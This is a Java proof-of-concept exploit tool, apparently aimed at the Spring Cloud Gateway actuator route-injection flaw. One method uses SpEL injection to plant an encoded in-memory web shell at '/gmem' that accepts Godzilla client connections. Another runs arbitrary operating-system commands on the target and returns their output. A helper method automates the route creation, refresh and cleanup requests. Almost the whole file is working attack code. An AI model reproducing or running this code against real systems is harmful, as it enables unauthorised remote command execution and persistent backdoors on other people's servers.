package org.example;

import cn.hutool.core.util.RandomUtil;
import cn.hutool.core.util.StrUtil;
import cn.hutool.http.Header;
import cn.hutool.http.HttpRequest;
import cn.hutool.http.HttpResponse;
import cn.hutool.json.JSONObject;
import cn.hutool.json.JSONUtil;

public class poc {

    //getshell
    public String GetShell (String host) {

        String payload = "#{T(org.springframework.cglib.core.ReflectUtils).defineClass('ms.GMemShell',T(org.springframework.util.Base64Utils).decodeFromString('yv66vgAAADQBeAoADQC2BwC3CgACALYJABIAuAoAAgC5CQASALoKAAIAuwoAEgC8CQASAL0KAA0AvggAcgcAvwcAwAcAwQcAwgoADADDCgAOAMQHAMUIAJ8HAMYHAMcKAA8AyAsAyQDKCgASALYKAA4AywgAzAcAzQoAGwDOCADPBwDQBwDRCgDSANMKANIA1AoAHgDVBwDWCACBBwCECQDXANgKANcA2QgA2goA2wDcBwDdCgAVAN4KACoA3woA2wDgCgDbAOEIAOIKAOMA5AoAFQDlCgDjAOYHAOcKAOMA6AoAMwDpCgAzAOoKABUA6wgA7AoADADtCADuCgAMAO8IAPAIAPEKAAwA8ggA8wgA9AgA9QgA9ggA9wsAFAD4EgAAAP4KAP8BAAcBAQkBAgEDCgBHAQQKABsBBQsBBgEHCgASAQgKABIBCQkAEgEKCAELCwEMAQ0KABIBDgsBDAEPCAEQBwERCgBUALYKAA0BEgoAFQETCgANALsKAFQBFAoAEgEVCgAVARYKAP8BFwcBGAoAXQC2CABlCAEZAQAFc3RvcmUBAA9MamF2YS91dGlsL01hcDsBAAlTaWduYXR1cmUBADVMamF2YS91dGlsL01hcDxMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL09iamVjdDs+OwEABHBhc3MBABJMamF2YS9sYW5nL1N0cmluZzsBAANtZDUBAAJ4YwEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAOTG1zL0dNZW1TaGVsbDsBAAhkb0luamVjdAEAOChMamF2YS9sYW5nL09iamVjdDtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQAVcmVnaXN0ZXJIYW5kbGVyTWV0aG9kAQAaTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBAA5leGVjdXRlQ29tbWFuZAEAEnJlcXVlc3RNYXBwaW5nSW5mbwEAQ0xvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9yZWFjdGl2ZS9yZXN1bHQvbWV0aG9kL1JlcXVlc3RNYXBwaW5nSW5mbzsBAANtc2cBAAFlAQAVTGphdmEvbGFuZy9FeGNlcHRpb247AQADb2JqAQASTGphdmEvbGFuZy9PYmplY3Q7AQAEcGF0aAEADVN0YWNrTWFwVGFibGUHAM0HAMcBABBNZXRob2RQYXJhbWV0ZXJzAQALZGVmaW5lQ2xhc3MBABUoW0IpTGphdmEvbGFuZy9DbGFzczsBAApjbGFzc2J5dGVzAQACW0IBAA51cmxDbGFzc0xvYWRlcgEAGUxqYXZhL25ldC9VUkxDbGFzc0xvYWRlcjsBAAZtZXRob2QBAApFeGNlcHRpb25zAQABeAEAByhbQlopW0IBAAFjAQAVTGphdmF4L2NyeXB0by9DaXBoZXI7AQABcwEAAW0BAAFaBwDFBwEaAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBAB1MamF2YS9zZWN1cml0eS9NZXNzYWdlRGlnZXN0OwEAA3JldAEADGJhc2U2NEVuY29kZQEAFihbQilMamF2YS9sYW5nL1N0cmluZzsBAAdFbmNvZGVyAQAGYmFzZTY0AQARTGphdmEvbGFuZy9DbGFzczsBAAJicwEABXZhbHVlAQAMYmFzZTY0RGVjb2RlAQAWKExqYXZhL2xhbmcvU3RyaW5nOylbQgEAB2RlY29kZXIBAANjbWQBAF0oTG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZlci9TZXJ2ZXJXZWJFeGNoYW5nZTspTG9yZy9zcHJpbmdmcmFtZXdvcmsvaHR0cC9SZXNwb25zZUVudGl0eTsBAAxidWZmZXJTdHJlYW0BAAJleAEABXBkYXRhAQAyTG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZlci9TZXJ2ZXJXZWJFeGNoYW5nZTsBABlSdW50aW1lVmlzaWJsZUFubm90YXRpb25zAQA1TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2JpbmQvYW5ub3RhdGlvbi9Qb3N0TWFwcGluZzsBAAQvY21kAQANbGFtYmRhJGNtZCQxMQEARyhMb3JnL3NwcmluZ2ZyYW1ld29yay91dGlsL011bHRpVmFsdWVNYXA7KUxyZWFjdG9yL2NvcmUvcHVibGlzaGVyL01vbm87AQAGYXJyT3V0AQAfTGphdmEvaW8vQnl0ZUFycmF5T3V0cHV0U3RyZWFtOwEAAWYBAAJpZAEABGRhdGEBAChMb3JnL3NwcmluZ2ZyYW1ld29yay91dGlsL011bHRpVmFsdWVNYXA7AQAGcmVzdWx0AQAZTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwcAtwEACDxjbGluaXQ+AQAKU291cmNlRmlsZQEADkdNZW1TaGVsbC5qYXZhDABpAGoBABdqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcgwAZQBmDAEbARwMAGgAZgwBHQEeDABnAJIMAGcAZgwBHwEgAQAPamF2YS9sYW5nL0NsYXNzAQAQamF2YS9sYW5nL09iamVjdAEAGGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZAEAQW9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3JlYWN0aXZlL3Jlc3VsdC9tZXRob2QvUmVxdWVzdE1hcHBpbmdJbmZvDAEhASIMASMBJAEADG1zL0dNZW1TaGVsbAEAMG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZlci9TZXJ2ZXJXZWJFeGNoYW5nZQEAEGphdmEvbGFuZy9TdHJpbmcMASUBKAcBKQwBKgErDAEsAS0BAAJvawEAE2phdmEvbGFuZy9FeGNlcHRpb24MAS4AagEABWVycm9yAQAXamF2YS9uZXQvVVJMQ2xhc3NMb2FkZXIBAAxqYXZhL25ldC9VUkwHAS8MATABMQwBMgEzDABpATQBABVqYXZhL2xhbmcvQ2xhc3NMb2FkZXIHATUMATYAmQwBNwE4AQADQUVTBwEaDAE5AToBAB9qYXZheC9jcnlwdG8vc3BlYy9TZWNyZXRLZXlTcGVjDAE7ATwMAGkBPQwBPgE/DAFAAUEBAANNRDUHAUIMATkBQwwBRAFFDAFGAUcBABRqYXZhL21hdGgvQmlnSW50ZWdlcgwBSAE8DABpAUkMAR0BSgwBSwEeAQAQamF2YS51dGlsLkJhc2U2NAwBTAFNAQAKZ2V0RW5jb2RlcgwBTgEiAQAOZW5jb2RlVG9TdHJpbmcBABZzdW4ubWlzYy5CQVNFNjRFbmNvZGVyDAFPAVABAAZlbmNvZGUBAApnZXREZWNvZGVyAQAGZGVjb2RlAQAWc3VuLm1pc2MuQkFTRTY0RGVjb2RlcgEADGRlY29kZUJ1ZmZlcgwBUQFSAQAQQm9vdHN0cmFwTWV0aG9kcw8GAVMQAVQPBwFVEACpDAFWAVcHAVgMAVkBWgEAJ29yZy9zcHJpbmdmcmFtZXdvcmsvaHR0cC9SZXNwb25zZUVudGl0eQcBWwwBXAFdDABpAV4MAV8BHgcBYAwBYQFUDACcAJ0MAIkAigwAYQBiAQAHcGF5bG9hZAcBYgwBYwFUDACBAIIMAWQBZQEACnBhcmFtZXRlcnMBAB1qYXZhL2lvL0J5dGVBcnJheU91dHB1dFN0cmVhbQwBZgFnDAFoAWkMAWoBPAwAlQCWDAFoAUoMAWsBbAEAEWphdmEvdXRpbC9IYXNoTWFwAQAQM2M2ZTBiOGE5YzE1MjI0YQEAE2phdmF4L2NyeXB0by9DaXBoZXIBAAZhcHBlbmQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAAh0b1N0cmluZwEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAIZ2V0Q2xhc3MBABMoKUxqYXZhL2xhbmcvQ2xhc3M7AQARZ2V0RGVjbGFyZWRNZXRob2QBAEAoTGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQANc2V0QWNjZXNzaWJsZQEABChaKVYBAAVwYXRocwEAB0J1aWxkZXIBAAxJbm5lckNsYXNzZXMBAGAoW0xqYXZhL2xhbmcvU3RyaW5nOylMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvcmVhY3RpdmUvcmVzdWx0L21ldGhvZC9SZXF1ZXN0TWFwcGluZ0luZm8kQnVpbGRlcjsBAElvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9yZWFjdGl2ZS9yZXN1bHQvbWV0aG9kL1JlcXVlc3RNYXBwaW5nSW5mbyRCdWlsZGVyAQAFYnVpbGQBAEUoKUxvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9yZWFjdGl2ZS9yZXN1bHQvbWV0aG9kL1JlcXVlc3RNYXBwaW5nSW5mbzsBAAZpbnZva2UBADkoTGphdmEvbGFuZy9PYmplY3Q7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBAA9wcmludFN0YWNrVHJhY2UBABBqYXZhL2xhbmcvVGhyZWFkAQANY3VycmVudFRocmVhZAEAFCgpTGphdmEvbGFuZy9UaHJlYWQ7AQAVZ2V0Q29udGV4dENsYXNzTG9hZGVyAQAZKClMamF2YS9sYW5nL0NsYXNzTG9hZGVyOwEAKShbTGphdmEvbmV0L1VSTDtMamF2YS9sYW5nL0NsYXNzTG9hZGVyOylWAQARamF2YS9sYW5nL0ludGVnZXIBAARUWVBFAQAHdmFsdWVPZgEAFihJKUxqYXZhL2xhbmcvSW50ZWdlcjsBAAtnZXRJbnN0YW5jZQEAKShMamF2YS9sYW5nL1N0cmluZzspTGphdmF4L2NyeXB0by9DaXBoZXI7AQAIZ2V0Qnl0ZXMBAAQoKVtCAQAXKFtCTGphdmEvbGFuZy9TdHJpbmc7KVYBAARpbml0AQAXKElMamF2YS9zZWN1cml0eS9LZXk7KVYBAAdkb0ZpbmFsAQAGKFtCKVtCAQAbamF2YS9zZWN1cml0eS9NZXNzYWdlRGlnZXN0AQAxKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9zZWN1cml0eS9NZXNzYWdlRGlnZXN0OwEABmxlbmd0aAEAAygpSQEABnVwZGF0ZQEAByhbQklJKVYBAAZkaWdlc3QBAAYoSVtCKVYBABUoSSlMamF2YS9sYW5nL1N0cmluZzsBAAt0b1VwcGVyQ2FzZQEAB2Zvck5hbWUBACUoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvQ2xhc3M7AQAJZ2V0TWV0aG9kAQALbmV3SW5zdGFuY2UBABQoKUxqYXZhL2xhbmcvT2JqZWN0OwEAC2dldEZvcm1EYXRhAQAfKClMcmVhY3Rvci9jb3JlL3B1Ymxpc2hlci9Nb25vOwoBbQFuAQAmKExqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsKABIBbwEABWFwcGx5AQAtKExtcy9HTWVtU2hlbGw7KUxqYXZhL3V0aWwvZnVuY3Rpb24vRnVuY3Rpb247AQAbcmVhY3Rvci9jb3JlL3B1Ymxpc2hlci9Nb25vAQAHZmxhdE1hcAEAPChMamF2YS91dGlsL2Z1bmN0aW9uL0Z1bmN0aW9uOylMcmVhY3Rvci9jb3JlL3B1Ymxpc2hlci9Nb25vOwEAI29yZy9zcHJpbmdmcmFtZXdvcmsvaHR0cC9IdHRwU3RhdHVzAQACT0sBACVMb3JnL3NwcmluZ2ZyYW1ld29yay9odHRwL0h0dHBTdGF0dXM7AQA6KExqYXZhL2xhbmcvT2JqZWN0O0xvcmcvc3ByaW5nZnJhbWV3b3JrL2h0dHAvSHR0cFN0YXR1czspVgEACmdldE1lc3NhZ2UBACZvcmcvc3ByaW5nZnJhbWV3b3JrL3V0aWwvTXVsdGlWYWx1ZU1hcAEACGdldEZpcnN0AQANamF2YS91dGlsL01hcAEAA2dldAEAA3B1dAEAOChMamF2YS9sYW5nL09iamVjdDtMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQAGZXF1YWxzAQAVKExqYXZhL2xhbmcvT2JqZWN0OylaAQAJc3Vic3RyaW5nAQAWKElJKUxqYXZhL2xhbmcvU3RyaW5nOwEAC3RvQnl0ZUFycmF5AQAEanVzdAEAMShMamF2YS9sYW5nL09iamVjdDspTHJlYWN0b3IvY29yZS9wdWJsaXNoZXIvTW9ubzsHAXAMAXEBdAwAqACpAQAiamF2YS9sYW5nL2ludm9rZS9MYW1iZGFNZXRhZmFjdG9yeQEAC21ldGFmYWN0b3J5BwF2AQAGTG9va3VwAQDMKExqYXZhL2xhbmcvaW52b2tlL01ldGhvZEhhbmRsZXMkTG9va3VwO0xqYXZhL2xhbmcvU3RyaW5nO0xqYXZhL2xhbmcvaW52b2tlL01ldGhvZFR5cGU7TGphdmEvbGFuZy9pbnZva2UvTWV0aG9kVHlwZTtMamF2YS9sYW5nL2ludm9rZS9NZXRob2RIYW5kbGU7TGphdmEvbGFuZy9pbnZva2UvTWV0aG9kVHlwZTspTGphdmEvbGFuZy9pbnZva2UvQ2FsbFNpdGU7BwF3AQAlamF2YS9sYW5nL2ludm9rZS9NZXRob2RIYW5kbGVzJExvb2t1cAEAHmphdmEvbGFuZy9pbnZva2UvTWV0aG9kSGFuZGxlcwAhABIADQAAAAQACQBhAGIAAQBjAAAAAgBkAAkAZQBmAAAACQBnAGYAAAAJAGgAZgAAAAoAAQBpAGoAAQBrAAAALwABAAEAAAAFKrcAAbEAAAACAGwAAAAGAAEAAAAWAG0AAAAMAAEAAAAFAG4AbwAAAAkAcABxAAIAawAAAUgABwAG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'),new javax.management.loading.MLet(new java.net.URL[0],T(java.lang.Thread).currentThread().getContextClassLoader())).doInject(@requestMappingHandlerMapping,'/gmem')}";

        String result = request(host, payload);

        if (result.equals("false")) {
            return "漏洞利用失败！";

        }else {
            String WebShell = host.replace("actuator/gateway","gmem");
            return "Get Shell 成功！\n哥斯拉默认连接（java_aes_base64）：" + WebShell;

        }

    }

    //执行命令
    public String rce (String host, String usercmd) {

        boolean cmdstatus = usercmd.contains(" ");
        if(cmdstatus){
            usercmd = usercmd.replace(" ","\\\",\\\"");
        }

        String payload = "#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\\\"{}\\\"}).getInputStream()))}";
        payload = StrUtil.format(payload,usercmd);

        String result = request(host, payload);

        if (result.equals("false")) {
            return "漏洞利用失败！";

        }else {
            JSONObject jsonObject = JSONUtil.parseObj(result);
            result = String.valueOf(jsonObject.get("filters"));
//        result = StrUtil.sub(test, 32, -18);
            result = StrUtil.subBetween(result, "= \'", "\\n'");

            //去除\n及\t
            boolean status1 = result.contains("\\n");
            boolean status2 = result.contains("\\t");

            if(status1){
                result = result.replace("\\n","\n");
            }if (status2){
                result = result.replace("\\t","\t");
            }
//        System.out.println(result);

            return result;

        }
    }

    //请求方法
    public String request (String host, String payloads) {

        //随机生成字符串
        String ro = "qazwsxedcrfvtgbyhnujmikolp";
        String random =  RandomUtil.randomString(ro,5);
//        System.out.println(random);

        String url1 = host + "/routes/"+random;
        String url2 = host + "/refresh";
        String url3 = host + "/routes/"+random;
        String url4 = host + "/routes/"+random;
        String url5 = host + "/refresh";

        String payload = "{\n" +
                "    \"id\": \"{}\",\n" +
                "    \"filters\": [{\n" +
                "        \"name\": \"AddResponseHeader\",\n" +
                "        \"args\": {\"name\": \"Result\",\"value\": \"{}\"}\n" +
                "}],\n" +
                "\"uri\": \"http://example.com\",\n" +
                "\"order\": 0\n" +
                "}";
        payload = StrUtil.format(payload,random);
        payload = StrUtil.format(payload,payloads);

        String AcceptEncoding = "gzip, deflate";
        String Accept = "*/*";
        String AcceptLanguage = "en";
        String UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36";
        String ContentType = "application/json";
        String ContentType2 = "application/x-www-form-urlencoded";

        HttpRequest.post(url1)
                .header(Header.ACCEPT_ENCODING,AcceptEncoding)
                .header(Header.ACCEPT,Accept)
                .header(Header.ACCEPT_LANGUAGE,AcceptLanguage)
                .header(Header.USER_AGENT,UserAgent)
                .header(Header.CONTENT_TYPE,ContentType)
                .body(payload)
                .timeout(60000)//超时，毫秒
                .execute().body();
        HttpRequest.post(url2)
                .header(Header.USER_AGENT,UserAgent)
                .header(Header.CONTENT_TYPE,ContentType2)
                .timeout(60000)//超时，毫秒
                .execute().body();
        HttpResponse res =  HttpRequest.get(url3)
                .header(Header.USER_AGENT,UserAgent)
                .header(Header.CONTENT_TYPE,ContentType2)
                .timeout(60000)//超时，毫秒
                .execute();
        HttpRequest.delete(url4)
                .header(Header.USER_AGENT,UserAgent)
                .header(Header.CONTENT_TYPE,ContentType2)
                .timeout(60000)//超时，毫秒
                .execute().body();
        HttpRequest.post(url5)
                .header(Header.USER_AGENT,UserAgent)
                .header(Header.CONTENT_TYPE,ContentType2)
                .timeout(60000)//超时，毫秒
                .execute().body();

        if (String.valueOf(res.getStatus()).equals("200")&&res.body().contains(random)) {
            return res.body();
        }else {
            return "false";
        }

    }
}


